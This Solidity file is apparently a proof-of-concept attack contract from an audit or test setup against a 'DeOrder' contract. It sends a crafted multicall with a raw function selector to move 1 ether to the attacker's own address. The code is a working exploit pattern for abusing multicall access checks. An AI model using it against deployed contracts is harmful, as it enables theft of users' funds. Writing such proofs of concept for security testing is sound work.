import {DeOrder} from "contracts/DeOrder.sol";
import {WETH} from "contracts/mock/WETH.sol";

contract AttackTransfer {
    DeOrder public deOrder;
    WETH public weth;

    constructor(DeOrder _deOrder, WETH _weth) {
        deOrder = _deOrder;
        weth = _weth;
    }

    receive() external payable {}

    function attack() external payable {
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSelector(
            0x37751b35,
            address(0),
            address(this),
            1 ether
        );
        deOrder.multicall(data);
    }
}
